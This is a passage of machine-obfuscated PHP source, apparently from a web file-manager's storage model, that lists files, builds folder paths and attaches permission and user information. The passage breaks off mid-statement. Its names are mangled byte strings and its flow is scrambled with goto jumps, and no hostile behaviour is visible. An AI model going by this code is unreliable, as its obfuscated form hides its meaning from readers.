unset($bªø·Ï[$dä¦‰ó„¾Ÿ][$fÎƒ®¾³Úƒ[75]]); $DİÃçË¾ = is_array($cÃÉÁËØ”„[$dä¦‰ó„¾Ÿ]) ? $cÃÉÁËØ”„[$dä¦‰ó„¾Ÿ] : array(); $BˆŠøœéêš[$fÎƒ®¾³Úƒ[163]] = array_merge($DİÃçË¾, $bªø·Ï[$dä¦‰ó„¾Ÿ]); goto EÇô®¢÷ò; EÇô®¢÷ò: if (isset($BˆŠøœéêš[$fÎƒ®¾³Úƒ[163]][$fÎƒ®¾³Úƒ[162]])) { $BˆŠøœéêš[$fÎƒ®¾³Úƒ[162]] = json_decode($BˆŠøœéêš[$fÎƒ®¾³Úƒ[163]][$fÎƒ®¾³Úƒ[162]], !0); unset($BˆŠøœéêš[$fÎƒ®¾³Úƒ[163]][$fÎƒ®¾³Úƒ[162]]); } goto B—ÎÜõË‚°; aˆ¸Æ–Š‘ô: $fÒİô»¸³[$fÎƒ®¾³Úƒ[77]] = $BˆŠøœéêš[$fÎƒ®¾³Úƒ[77]]; $fÒİô»¸³[$fÎƒ®¾³Úƒ[28]] = $BˆŠøœéêš[$fÎƒ®¾³Úƒ[28]]; if (!isset(self::$cacheFileInfo[$fÎƒ®¾³Úƒ[447] . $dä¦‰ó„¾Ÿ])) { self::$cacheFileInfo[$fÎƒ®¾³Úƒ[447] . $dä¦‰ó„¾Ÿ] = array_merge(array(), $fÒİô»¸³); } goto dóƒÇ‰ƒ‹Õ; eĞàÖ¥Öº°: $dä¦‰ó„¾Ÿ = $BˆŠøœéêš[$fÎƒ®¾³Úƒ[441]]; if (!$dä¦‰ó„¾Ÿ || !isset($bªø·Ï[$dä¦‰ó„¾Ÿ])) { continue; } $fÒİô»¸³ = $bªø·Ï[$dä¦‰ó„¾Ÿ]; goto aˆ¸Æ–Š‘ô; B—ÎÜõË‚°: } unset($BˆŠøœéêš); goto C†ÖùƒÕ”…; fæˆïê¬˜Ì: if (!$FÅëí‡‡èù) { return; } $AÔ¼ìÑÇ¾İ = array($fÎƒ®¾³Úƒ[442] => array($fÎƒ®¾³Úƒ[405], $FÅëí‡‡èù)); $aîöÇ†÷ôæ = $fÎƒ®¾³Úƒ[443]; goto E÷­ĞÚÆœ; A‡Œ½µ¢‘è: $fÎƒ®¾³Úƒ =& $_SERVER[µ…]; $FÅëí‡‡èù = array_to_keyvalue($A—Ïà“˜Õ¥, $fÎƒ®¾³Úƒ[33], $fÎƒ®¾³Úƒ[441]); $FÅëí‡‡èù = array_filter(array_unique($FÅëí‡‡èù)); goto fæˆïê¬˜Ì; E÷­ĞÚÆœ: $bªø·Ï = Model($fÎƒ®¾³Úƒ[444])->field($aîöÇ†÷ôæ)->where($AÔ¼ìÑÇ¾İ)->select(); $bªø·Ï = array_to_keyvalue($bªø·Ï, $fÎƒ®¾³Úƒ[441]); $a¥¨ÀÑŠ“ñ = Model($fÎƒ®¾³Úƒ[445])->field($fÎƒ®¾³Úƒ[446])->where($AÔ¼ìÑÇ¾İ)->select(); goto A‹¸ˆ†šÁÈ; A‹¸ˆ†šÁÈ: $a¥¨ÀÑŠ“ñ = $a¥¨ÀÑŠ“ñ ? $a¥¨ÀÑŠ“ñ : array(); $cÃÉÁËØ”„ = array(); foreach ($a¥¨ÀÑŠ“ñ as $EÍİĞ¯¦Ëƒ) { if (!isset($cÃÉÁËØ”„[$EÍİĞ¯¦Ëƒ[$fÎƒ®¾³Úƒ[441]]])) { $cÃÉÁËØ”„[$EÍİĞ¯¦Ëƒ[$fÎƒ®¾³Úƒ[441]]] = array(); } $cÃÉÁËØ”„[$EÍİĞ¯¦Ëƒ[$fÎƒ®¾³Úƒ[441]]][$EÍİĞ¯¦Ëƒ[$fÎƒ®¾³Úƒ[92]]] = $EÍİĞ¯¦Ëƒ[$fÎƒ®¾³Úƒ[370]]; } goto DµäĞŞÈëÙ; C†ÖùƒÕ”…: } protected function _listAppendSourceInfo(&$d£ëŒŞ‰èŒ, $cÂ¾èÍ«“§) { goto bö»š«À‘Õ; F›‹×µ¦Ú£: return $d£ëŒŞ‰èŒ; goto AŒÁÈ‡áÚ¼; EäŸÂš•ëÀ: $C¦å»ÄÛ¯§ = Model($AŠÍ”òŞ™[412])->listData(); $eª°ÁìŒˆÈ = Model($AŠÍ”òŞ™[402])->listData(); $EÒÒ¥Àœâ´ = Model($AŠÍ”òŞ™[450])->listSimple(); goto C±¾¾ÜŸô°; fõ§Ö¯Í–: $BÇÃ§ë³ = array_to_keyvalue_group($EÒÒ¥Àœâ´, $AŠÍ”òŞ™[390]); foreach ($d£ëŒŞ‰èŒ as &$c’ŠÃ¸šˆá) { $c’ŠÃ¸šˆá[$AŠÍ”òŞ™[84]] = array($AŠÍ”òŞ™[451] => 0, $AŠÍ”òŞ™[452] => 0, $AŠÍ”òŞ™[453] => 0); if (isset($A³ÎŸö‘ä[$c’ŠÃ¸šˆá[$AŠÍ”òŞ™[390]]])) { $c’ŠÃ¸šˆá[$AŠÍ”òŞ™[84]][$AŠÍ”òŞ™[454]] = 1; $c’ŠÃ¸šˆá[$AŠÍ”òŞ™[84]][$AŠÍ”òŞ™[455]] = $A³ÎŸö‘ä[$c’ŠÃ¸šˆá[$AŠÍ”òŞ™[390]]][$AŠÍ”òŞ™[28]]; } if (isset($dö‹´Œ¾„[$c’ŠÃ¸šˆá[$AŠÍ”òŞ™[390]]])) { $c’ŠÃ¸šˆá[$AŠÍ”òŞ™[84]][$AŠÍ”òŞ™[456]] = array(); foreach ($dö‹´Œ¾„[$c’ŠÃ¸šˆá[$AŠÍ”òŞ™[390]]] as $fâ¾¼ÛßŸ¤) { $AŠ¾¬êƒ„Û = $dï›ßêë¯ˆ[$fâ¾¼ÛßŸ¤]; $c’ŠÃ¸šˆá[$AŠÍ”òŞ™[84]][$AŠÍ”òŞ™[456]][] = array($AŠÍ”òŞ™[457] => $AŠ¾¬êƒ„Û[$AŠÍ”òŞ™[388]], $AŠÍ”òŞ™[407] => $AŠ¾¬êƒ„Û[$AŠÍ”òŞ™[28]], $AŠÍ”òŞ™[458] => $AŠ¾¬êƒ„Û[$AŠÍ”òŞ™[459]]); } } if (isset($BÇÃ§ë³[$c’ŠÃ¸šˆá[$AŠÍ”òŞ™[390]]])) { $c’ŠÃ¸šˆá[$AŠÍ”òŞ™[84]][$AŠÍ”òŞ™[460]] = array(); foreach ($BÇÃ§ë³[$c’ŠÃ¸šˆá[$AŠÍ”òŞ™[390]]] as $A÷Ã‰…¦ˆø) { $c’ŠÃ¸šˆá[$AŠÍ”òŞ™[84]][$AŠÍ”òŞ™[460]] = array($AŠÍ”òŞ™[461] => $A÷Ã‰…¦ˆø[$AŠÍ”òŞ™[462]], $AŠÍ”òŞ™[463] => $A÷Ã‰…¦ˆø[$AŠÍ”òŞ™[464]], $AŠÍ”òŞ™[465] => $A÷Ã‰…¦ˆø[$AŠÍ”òŞ™[390]], $AŠÍ”òŞ™[466] => $A÷Ã‰…¦ˆø[$AŠÍ”òŞ™[467]], $AŠÍ”òŞ™[468] => $A÷Ã‰…¦ˆø[$AŠÍ”òŞ™[469]], $AŠÍ”òŞ™[470] => $A÷Ã‰…¦ˆø[$AŠÍ”òŞ™[470]], $AŠÍ”òŞ™[471] => $A÷Ã‰…¦ˆø[$AŠÍ”òŞ™[471]]); } } } unset($c’ŠÃ¸šˆá); goto F›‹×µ¦Ú£; C±¾¾ÜŸô°: $dï›ßêë¯ˆ = array_to_keyvalue($FÁÕÕÁ‘Ö, $AŠÍ”òŞ™[388]); $dö‹´Œ¾„ = array_to_keyvalue_group($C¦å»ÄÛ¯§, $AŠÍ”òŞ™[75], $AŠÍ”òŞ™[413]); $A³ÎŸö‘ä = array_to_keyvalue($eª°ÁìŒˆÈ, $AŠÍ”òŞ™[75]); goto fõ§Ö¯Í–; bö»š«À‘Õ: $AŠÍ”òŞ™ =& $_SERVER[µ…]; if (!defined($AŠÍ”òŞ™[448])) { return; } $FÁÕÕÁ‘Ö = Model($AŠÍ”òŞ™[449])->listData(); goto EäŸÂš•ëÀ; AŒÁÈ‡áÚ¼: } protected function _listAppendChildren(&$d¬¶—†‘ , $bš´¹æëÜ„) { goto b‡­«–î“; d‘®È‡™õÎ: foreach ($d¬¶—†‘  as &$Cåä‡Òµö³) { if (!$Cåä‡Òµö³[$C’¶ÜÄœµ[397]]) { continue; } $EÈ˜ èç”¢[] = $Cåä‡Òµö³[$C’¶ÜÄœµ[390]]; } unset($Cåä‡Òµö³); if (!$EÈ˜ èç”¢) { return; } goto DÇå©£´Í´; A½İßè¹ ÷: $DšâÔŒ‘š = array(); foreach ($bÁÍä²· as $a¬›©ŠïËï) { $bİí± ¡ÎÎ = $a¬›©ŠïËï[$C’¶ÜÄœµ[472]]; $d¸…ˆƒÔÃï = $a¬›©ŠïËï[$C’¶ÜÄœµ[397]] == $C’¶ÜÄœµ[86] ? $C’¶ÜÄœµ[202] : $C’¶ÜÄœµ[201]; if (!isset($DšâÔŒ‘š[$bİí± ¡ÎÎ])) { $DšâÔŒ‘š[$bİí± ¡ÎÎ] = array($C’¶ÜÄœµ[201] => 0, $C’¶ÜÄœµ[202] => 0); } $DšâÔŒ‘š[$bİí± ¡ÎÎ][$d¸…ˆƒÔÃï] += $a¬›©ŠïËï[$C’¶ÜÄœµ[474]]; } foreach ($d¬¶—†‘  as &$Cåä‡Òµö³) { if (!$Cåä‡Òµö³[$C’¶ÜÄœµ[397]]) { continue; } $f” ùÎÖÇŒ = is_array($DšâÔŒ‘š[$Cåä‡Òµö³[$C’¶ÜÄœµ[390]]]) ? $DšâÔŒ‘š[$Cåä‡Òµö³[$C’¶ÜÄœµ[390]]] : $aÍÀ¨ÖöÅÉ; $Cåä‡Òµö³[$C’¶ÜÄœµ[202]] = $f” ùÎÖÇŒ[$C’¶ÜÄœµ[202]]; $Cåä‡Òµö³[$C’¶ÜÄœµ[201]] = $f” ùÎÖÇŒ[$C’¶ÜÄœµ[201]]; unset($Cåä‡Òµö³[$C’¶ÜÄœµ[399]]); } goto A„Şš¨ä½; DÇå©£´Í´: $d¦î¿½öÔ = array($C’¶ÜÄœµ[472] => array($C’¶ÜÄœµ[7], $EÈ˜ èç”¢)); $FƒÁ³À›ï = array($C’¶ÜÄœµ[472], $C’¶ÜÄœµ[397], $C’¶ÜÄœµ[473] => $C’¶ÜÄœµ[474]); $bÁÍä²· = $this->field($FƒÁ³À›ï)->where($d¦î¿½öÔ)->group($C’¶ÜÄœµ[475])->select(); goto A½İßè¹ ÷; b‡­«–î“: $C’¶ÜÄœµ =& $_SERVER[µ…]; $EÈ˜ èç”¢ = array(); $aÍÀ¨ÖöÅÉ = array($C’¶ÜÄœµ[201] => 0, $C’¶ÜÄœµ[202] => 0); goto d‘®È‡™õÎ; A„Şš¨ä½: unset($Cåä‡Òµö³); goto c—ŠØ”¬Ù®; c—ŠØ”¬Ù®: } protected function _listAppendAuth(&$a†Ê™â´ ) { goto Aªòªˆ‘„Ş; Aªòªˆ‘„Ş: $eˆÒß®–æ» =& $_SERVER[µ…]; if (!defined($eˆÒß®–æ»[448])) { return; } $c‚ôÉ Ñ±ù = array(); goto fÉÃßòí§ê; Aê•Áš Ã¿: $c»Ãå´ = Model($eˆÒß®–æ»[476])->getSourceList($c‚ôÉ Ñ±ù, $D­ĞÉ  Ù); foreach ($a†Ê™â´  as $f§ËÃœ³¸– => &$aÈó÷àìƒ°) { $aÈó÷àìƒ°[$eˆÒß®–æ»[400]] = $c»Ãå´[$aÈó÷àìƒ°[$eˆÒß®–æ»[390]]]; if (!$aÈó÷àìƒ°[$eˆÒß®–æ»[400]] && $aÈó÷àìƒ°[$eˆÒß®–æ»[398]] == self::TYPE_GROUP) { $aÈó÷àìƒ°[$eˆÒß®–æ»[400]] = Action($eˆÒß®–æ»[477])->pathGroupAuthMake($aÈó÷àìƒ°[$eˆÒß®–æ»[478]]); if (!$aÈó÷àìƒ°[$eˆÒß®–æ»[400]] && !_get($GLOBALS, $eˆÒß®–æ»[479])) { $aÈó÷àìƒ°[$eˆÒß®–æ»[194]] = !1; $aÈó÷àìƒ°[$eˆÒß®–æ»[193]] = !1; } } if ($aÈó÷àìƒ°[$eˆÒß®–æ»[400]]) { $aÈó÷àìƒ°[$eˆÒß®–æ»[194]] = AuthModel::authCheckEdit($aÈó÷àìƒ°[$eˆÒß®–æ»[400]][$eˆÒß®–æ»[401]]); $aÈó÷àìƒ°[$eˆÒß®–æ»[193]] = AuthModel::authCheckView($aÈó÷àìƒ°[$eˆÒß®–æ»[400]][$eˆÒß®–æ»[401]]); } $this->groupPathDisplay($aÈó÷àìƒ°); } unset($aÈó÷àìƒ°); goto e¢Ñ‹çÄà; fÉÃßòí§ê: foreach ($a†Ê™â´  as $aÈó÷àìƒ°) { if ($aÈó÷àìƒ°[$eˆÒß®–æ»[398]] == self::TYPE_GROUP) { $c‚ôÉ Ñ±ù[] = $aÈó÷àìƒ°[$eˆÒß®–æ»[390]]; } } if (!$c‚ôÉ Ñ±ù) { return; } $D­ĞÉ  Ù = array_to_keyvalue($a†Ê™â´ , $eˆÒß®–æ»[390]); goto Aê•Áš Ã¿; e¢Ñ‹çÄà: } public function groupPathDisplay(&$CÑß¦ˆÂÊö) { goto D•¿ÚÖƒÌ·; BŞÎ§˜ŒÑ¯: $eƒøÀ¾…„¹ = $this->parentLevelArray($DòƒÏÏÈ†[$dØ£ƒ‰ğÁµ[481]]); $FªËÃã§¤ = $dØ£ƒ‰ğÁµ[33]; foreach ($eƒøÀ¾…„¹ as $b“Şàìì®ù) { $C¿øâ±ßƒÒ = Model($dØ£ƒ‰ğÁµ[480])->getInfo($b“Şàìì®ù); $FªËÃã§¤ .= $C¿øâ±ßƒÒ[$dØ£ƒ‰ğÁµ[84]][$dØ£ƒ‰ğÁµ[390]] . $dØ£ƒ‰ğÁµ[47]; } goto eÃë÷Ö¡–; D•¿ÚÖƒÌ·: $dØ£ƒ‰ğÁµ =& $_SERVER[µ…]; if ($CÑß¦ˆÂÊö[$dØ£ƒ‰ğÁµ[398]] != self::TYPE_GROUP) { return; } $DòƒÏÏÈ† = Model($dØ£ƒ‰ğÁµ[480])->getInfo($CÑß¦ˆÂÊö[$dØ£ƒ‰ğÁµ[478]]); goto BŞÎ§˜ŒÑ¯; AÅ¿¡™¨µÌ: $CÑß¦ˆÂÊö[$dØ£ƒ‰ğÁµ[486]] = $FªËÃã§¤ . $DòƒÏÏÈ†[$dØ£ƒ‰ğÁµ[84]][$dØ£ƒ‰ğÁµ[390]]; goto cùºÜ¿ëÊÃ; eÃë÷Ö¡–: $CÑß¦ˆÂÊö[$dØ£ƒ‰ğÁµ[482]] = $DòƒÏÏÈ†[$dØ£ƒ‰ğÁµ[472]]; $CÑß¦ˆÂÊö[$dØ£ƒ‰ğÁµ[483]] = $DòƒÏÏÈ†[$dØ£ƒ‰ğÁµ[481]]; $CÑß¦ˆÂÊö[$dØ£ƒ‰ğÁµ[484]] = $DòƒÏÏÈ†[$dØ£ƒ‰ğÁµ[485]]; goto AÅ¿¡™¨µÌ; cùºÜ¿ëÊÃ: } protected function _listAppendPath(&$fˆÃ ºÉ) { goto F¼×Ü›Èœ; F¼×Ü›Èœ: $EÓàÑÔŠÏ˜ =& $_SERVER[µ…]; static $Eò¹¢–ÆĞÃ = array(); $FËî¢ª¤Š… = array(); goto E‡Şæµ«‡; E†èâÁ„„: $F§Ì‡Ö©ªã = array(); $Cß¥½ŸºÄÓ = array(); foreach ($fˆÃ ºÉ as &$C¾Îöñç–†) { goto dİè†Öš’; bğ˜ÌõˆèŒ: if (intval($C¾Îöñç–†[$EÓàÑÔŠÏ˜[398]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($C¾Îöñç–†, $BÆ”ÙèÊİÊ, $CÆ”æ²); } goto fæå… ¸Şá; dİè†Öš’: $Fâ¨´˜ˆâ– = $C¾Îöñç–†[$EÓàÑÔŠÏ˜[481]]; if (isset($Cß¥½ŸºÄÓ[$Fâ¨´˜ˆâ–])) { $E‰ß§ØÇ = $F§Ì‡Ö©ªã[$Fâ¨´˜ˆâ–]; } else { $BÆ”ÙèÊİÊ = $this->parentLevelArray($C¾Îöñç–†[$EÓàÑÔŠÏ˜[481]]); $E® ‰ÆËÈ = $EÓàÑÔŠÏ˜[488] . $C¾Îöñç–†[$EÓàÑÔŠÏ˜[398]] . $EÓàÑÔŠÏ˜[434] . $C¾Îöñç–†[$EÓàÑÔŠÏ˜[478]]; if ($F§Ì‡Ö©ªã[$E® ‰ÆËÈ]) { $E‰ß§ØÇ = $F§Ì‡Ö©ªã[$E® ‰ÆËÈ]; } else { $E‰ß§ØÇ = $this->_listAppendPathRoot($C¾Îöñç–†, $BÆ”ÙèÊİÊ); $F§Ì‡Ö©ªã[$E® ‰ÆËÈ] = $E‰ß§ØÇ; } foreach ($BÆ”ÙèÊİÊ as $e±ÇåÄàÔÛ => $c¤§×Û¡†) { if ($e±ÇåÄàÔÛ == 0 && $E‰ß§ØÇ && $C¾Îöñç–†[$EÓàÑÔŠÏ˜[398]] == self::TYPE_GROUP) { continue; } if (isset($Eò¹¢–ÆĞÃ[$c¤§×Û¡†])) { $E‰ß§ØÇ .= $Eò¹¢–ÆĞÃ[$c¤§×Û¡†] . $EÓàÑÔŠÏ˜[8]; } } if ($BÆ”ÙèÊİÊ) { $E‰ß§ØÇ .= $C¾Îöñç–†[$EÓàÑÔŠÏ˜[28]]; } $F§Ì‡Ö©ªã[$Fâ¨´˜ˆâ–] = $E‰ß§ØÇ; } if ($C¾Îöñç–†[$EÓàÑÔŠÏ˜[397]]) { $E‰ß§ØÇ .= $EÓàÑÔŠÏ˜[8]; } goto ašŞ÷îÆ½µ; ašŞ÷îÆ½µ: $C¾Îöñç–†[$EÓàÑÔŠÏ˜[489]] = str_replace($EÓàÑÔŠÏ˜[490], $EÓàÑÔŠÏ˜[8], $E‰ß§ØÇ); $eªãíŠô‰± = trim($C¾Îöñç–†[$EÓàÑÔŠÏ˜[489]], $EÓàÑÔŠÏ˜[8]); if ($C¾Îöñç–†[$EÓàÑÔŠÏ˜[472]] == $EÓàÑÔŠÏ˜[491] && $eªãíŠô‰±) { $C¾Îöñç–†[$EÓàÑÔŠÏ˜[28]] = $eªãíŠô‰±; } goto bğ˜ÌõˆèŒ; fæå… ¸Şá: } goto C’éëšÔñ‘; C’éëšÔñ‘: unset($C¾Îöñç–†); return $fˆÃ ºÉ; goto EŠ‘®‰åÌ; E‡Şæµ«‡: $fÚ‚ËÊÕ„Û = array(); foreach ($fˆÃ ºÉ as &$C¾Îöñç–†) { $cóÆ†Óò« = $C¾Îöñç–†[$EÓàÑÔŠÏ˜[397]] == $EÓàÑÔŠÏ˜[86]; if ($cóÆ†Óò«) { $Eò¹¢–ÆĞÃ[$C¾Îöñç–†[$EÓàÑÔŠÏ˜[390]]] = $C¾Îöñç–†[$EÓàÑÔŠÏ˜[28]]; } if (isset($fÚ‚ËÊÕ„Û[$C¾Îöñç–†[$EÓàÑÔŠÏ˜[481]]])) { continue; } $fÚ‚ËÊÕ„Û[$C¾Îöñç–†[$EÓàÑÔŠÏ˜[481]]] = !0; $BÆ”ÙèÊİÊ = $this->parentLevelArray($C¾Îöñç–†[$EÓàÑÔŠÏ˜[481]]); foreach ($BÆ”ÙèÊİÊ as $e±ÇåÄàÔÛ => $c¤§×Û¡†) { if ($e±ÇåÄàÔÛ != 0 && !isset($Eò¹¢–ÆĞÃ[$c¤§×Û¡†])) { $FËî¢ª¤Š…[] = $c¤§×Û¡†; } } } unset($C¾Îöñç–†); goto e†ªà¼æ ; e†ªà¼æ : $FËî¢ª¤Š… = array_unique($FËî¢ª¤Š…); if (count($FËî¢ª¤Š…) > 0) { $A×òƒº„ğ = array($EÓàÑÔŠÏ˜[404] => array($EÓàÑÔŠÏ˜[405], $FËî¢ª¤Š…)); if (count($FËî¢ª¤Š…) == 1) { $D¬¢Ü‰ğÀ„ = $this->sourceInfo($FËî¢ª¤Š…[0]); $Cš½Õ“¢¦ñ = is_array($D¬¢Ü‰ğÀ„) ? array($D¬¢Ü‰ğÀ„) : !1; } else { $Cš½Õ“¢¦ñ = $this->field($EÓàÑÔŠÏ˜[487])->where($A×òƒº„ğ)->select(); } if (!$Cš½Õ“¢¦ñ) { $Cš½Õ“¢¦ñ = array(); } foreach ($Cš½Õ“¢¦ñ as $b§¡Å½Ï—ø) { $Eò¹¢–ÆĞÃ[$b§¡Å½Ï—ø[$EÓàÑÔŠÏ˜[390]]] = $b§¡Å½Ï—ø[$EÓàÑÔŠÏ˜[28]]; } } $CÆ”æ² = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto E†èâÁ„„; EŠ‘®‰åÌ: } private function _listAppendPathRecycle(&$b©Í“ìôù, $dÁ‰È“, $aé¦†«ÃÂè) { goto bğ…“„¹ê; bğ…“„¹ê: $Cñğ§¸ã =& $_SERVER[µ…]; if (!in_array($aé¦†«ÃÂè, $dÁ‰È“) && $b©Í“ìôù[$Cñğ§¸ã[390]] != $aé¦†«ÃÂè) { return; } $fÉóÃèŸÄƒ = explode($Cñğ§¸ã[8], trim($b©Í“ìôù[$Cñğ§¸ã[489]], $Cñğ§¸ã[8])); goto fÑèïêïö; aäˆÂËŒ: if ($b©Í“ìôù[$Cñğ§¸ã[390]] == $aé¦†«ÃÂè) { $b©Í“ìôù[$Cñğ§¸ã[481]] = $Cñğ§¸ã[493]; $b©Í“ìôù[$Cñğ§¸ã[472]] = $Cñğ§¸ã[491]; $b©Í“ìôù[$Cñğ§¸ã[28]] = LNG($Cñğ§¸ã[492]); } $b©Í“ìôù[$Cñğ§¸ã[494]] = $Cñğ§¸ã[495]; goto E½À±…â‚; fÑèïêïö: $aó¶Ïâ¶Ÿ³ = implode($Cñğ§¸ã[8], array_slice($fÉóÃèŸÄƒ, 2)); $b©Í“ìôù[$Cñğ§¸ã[489]] = $Cñğ§¸ã[8] . LNG($Cñğ§¸ã[492]) . $Cñğ§¸ã[8] . ltrim($aó¶Ïâ¶Ÿ³, $Cñğ§¸ã[8]); $b©Í“ìôù[$Cñğ§¸ã[481]] = $Cñğ§¸ã[493] . implode($Cñğ§¸ã[47], array_slice($dÁ‰È“, 1)) . $Cñğ§¸ã[47]; goto aäˆÂËŒ; E½À±…â‚: } protected function _listAppendPathRoot(&$e—µä„ª×, $eëâ™Á¥­…) { $e‡—Œ’…Û =& $_SERVER[µ…]; $fƒ±ŒËÜ¦ = $e‡—Œ’…Û[33]; if ($e—µä„ª×[$e‡—Œ’…Û[398]] == self::TYPE_USER) { if (defined($e‡—Œ’…Û[448]) && $e—µä„ª×[$e‡—Œ’…Û[478]] == USER_ID) { $fƒ±ŒËÜ¦ = LNG($e‡—Œ’…Û[496]); if (!$eëâ™Á¥­…) { $e—µä„ª×[$e‡—Œ’…Û[28]] = $fƒ±ŒËÜ¦; } } else { $DœãÚ–Ã˜° = Model($e‡—Œ’…Û[497])->getInfoSimple($e—µä„ª×[$e‡—Œ’…Û[478]]); $fƒ±ŒËÜ¦ = LNG($e‡—Œ’…Û[498]) . $e‡—Œ’…Û[159] . $DœãÚ–Ã˜°[$e‡—Œ’…Û[28]] . $e‡—Œ’…Û[499]; } } else { if ($e—µä„ª×[$e‡—Œ’…Û[398]] == self::TYPE_GROUP) { $DœãÚ–Ã˜° = Model($e‡—Œ’…Û[480])->getInfoSimple($e—µä„ª×[$e‡—Œ’…Û[478]]); $fƒ±ŒËÜ¦ = $DœãÚ–Ã˜°[$e‡—Œ’…Û[28]]; } else { if ($e—µä„ª×[$e‡—Œ’…Û[398]] == self::TYPE_SYSTEM) { $fƒ±ŒËÜ¦ = $e‡—Œ’…Û[500]; } } } $fƒ±ŒËÜ¦ = $fƒ±ŒËÜ¦ ? $e‡—Œ’…Û[8] . $fƒ±ŒËÜ¦ . $e‡—Œ’…Û[8] : $e‡—Œ’…Û[8]; return $fƒ±ŒËÜ¦; } protected function _listAppendUser(&$e‰“ã½×¿) { goto FŞÓö‰®™; BŸ×ÆŸˆù: $e¼Œ Şİ®… = array_merge($A‡øÓ¯îâ®, $dº•Ú„Øõ¢); $A†¢ªîñà¡ = Model($D­¼²ê‚‚ƒ[501])->userListInfo($e¼Œ Şİ®…); foreach ($e‰“ã½×¿ as &$c„¡ïİ³š¿) { $E–‹äÂ»Ü• = $c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[426]]; $c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[426]] = $A†¢ªîñà¡[$E–‹äÂ»Ü•] ? $A†¢ªîñà¡[$E–‹äÂ»Ü•] : !1; $E–‹äÂ»Ü• = $c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[428]]; $c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[428]] = $A†¢ªîñà¡[$E–‹äÂ»Ü•] ? $A†¢ªîñà¡[$E–‹äÂ»Ü•] : !1; if (isset($c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[439]]) && $c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[439]][$D­¼²ê‚‚ƒ[502]]) { $AÊÒ¦–·‚ = $GLOBALS[$D­¼²ê‚‚ƒ[6]][$D­¼²ê‚‚ƒ[87]][$D­¼²ê‚‚ƒ[503]]; if ($c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[439]][$D­¼²ê‚‚ƒ[504]] <= time() - $AÊÒ¦–·‚) { $this->metaSet($c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[390]], $D­¼²ê‚‚ƒ[502], null); $this->metaSet($c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[390]], $D­¼²ê‚‚ƒ[504], null); unset($c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[439]][$D­¼²ê‚‚ƒ[502]]); continue; } $Fõ©òã‡ˆ° = $c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[439]][$D­¼²ê‚‚ƒ[502]]; $c„¡ïİ³š¿[$D­¼²ê‚‚ƒ[439]][$D­¼²ê‚‚ƒ[505]] = Model($D­¼²ê‚‚ƒ[501])->getInfoSimpleOuter($Fõ©òã‡ˆ°); } } goto Fš««‚¥½; FŞÓö‰®™: $D­¼²ê‚‚ƒ =& $_SERVER[µ…]; $A‡øÓ¯îâ® = array_to_keyvalue($e‰“ã½×¿, $D­¼²ê‚‚ƒ[33], $D­¼²ê‚‚ƒ[426]); $dº•Ú„Øõ¢ = array_to_keyvalue($e‰“ã½×¿, $D­¼²ê‚‚ƒ[33], $D­¼²ê‚‚ƒ[428]); goto BŸ×ÆŸˆù; Fš««‚¥½: unset($c„¡ïİ³š¿); goto f£å ÙŒÂ; f£å ÙŒÂ: } public function parentLevelArray($B¿šÖòä¶) { $A¦õˆÌ†Ï =& $_SERVER[µ…]; $B¿šÖòä¶ = explode($A¦õˆÌ†Ï[47], trim($B¿šÖòä¶, $A¦õˆÌ†Ï[47])); return array_remove_value($B¿šÖòä¶, $A¦õˆÌ†Ï[491]); } public function listAll($dÄº”ÖÏÆ) { goto d”‰Ÿ„¿È; d”‰Ÿ„¿È: $EÎÊÂ¹ë‘¸ =& $_SERVER[µ…]; $d…©«Áƒ… = $this->sourceInfo($dÄº”ÖÏÆ); $C×Ëä¼Ò™È = array($EÎÊÂ¹ë‘¸[506] => array($EÎÊÂ¹ë‘¸[507], $d…©«Áƒ…[$EÎÊÂ¹ë‘¸[481]] . $dÄº”ÖÏÆ . $EÎÊÂ¹ë‘¸[508]), $EÎÊÂ¹ë‘¸[509] => 0); goto cÁ‰íÀ Í; cÁ‰íÀ Í: $cª·¸¦ÁÖ’ = $EÎÊÂ¹ë‘¸[510]; $b±¤Ò„Šù™ = "\x4c\105\x46\x54\x20\112\x4f\111\116\40{$this->tablePrefix}\x69\x6f\x5f\146\x69\x6c\145\x20\x66\151\154\145\40\157\x6e\x20\163\x6f\x75\162\143\x65\56\146\151\x6c\x65\x49\x44\x20\x3d\x20\x66\x69\154\x65\x2e\x66\x69\154\145\x49\x44"; $dÂ‡å¤Ã = $this->alias($EÎÊÂ¹ë‘¸[511])->field($cª·¸¦ÁÖ’)->where($C×Ëä¼Ò™È)->join($b±¤Ò„Šù™)->select(); goto CÛåÛï»¸ğ; EÜŸÏó: $E×š¢å±ŠÔ = array(); foreach ($dÂ‡å¤Ã as $e…ÒİòŠÁ» => $bà”­‚é‹¼) { goto E†ƒ„Ì¼’³; dÖìóø‹İ: for ($cÕªãÀ•—¬ = 0; $cÕªãÀ•—¬ < count($C†Ë‘×–†×); $cÕªãÀ•—¬++) { $fã¦İÉŠ«Å .= $dÂ‡å¤Ã[$C†Ë‘×–†×[$cÕªãÀ•—¬]][$EÎÊÂ¹ë‘¸[28]] . $EÎÊÂ¹ë‘¸[8]; } $fã¦İÉŠ«Å .= $bà”­‚é‹¼[$EÎÊÂ¹ë‘¸[28]]; if ($bà”­‚é‹¼[$EÎÊÂ¹ë‘¸[397]]) { $fã¦İÉŠ«Å .= $EÎÊÂ¹ë‘¸[8]; } goto e«‚ªí§©; EÏˆ®¡³: if (!$bà”­‚é‹¼[$EÎÊÂ¹ë‘¸[397]]) { $e¤ÂøÒŒÂ‚[$EÎÊÂ¹ë‘¸[441]] = $bà”­‚é‹¼[$EÎÊÂ¹ë‘¸[441]]; $e¤ÂøÒŒÂ‚[$EÎÊÂ¹ë‘¸[85]] = $bà”­‚é‹¼[$EÎÊÂ¹ë‘¸[75]]; } $E×š¢å±ŠÔ[] = $e¤ÂøÒŒÂ‚; goto cñ¡«´¢ö ; e«‚ªí§©: $fã¦İÉŠ«Å = str_replace($EÎÊÂ¹ë‘¸[490], $EÎÊÂ¹ë‘¸[8], $fã¦İÉŠ«Å); $fã¦İÉŠ«Å = 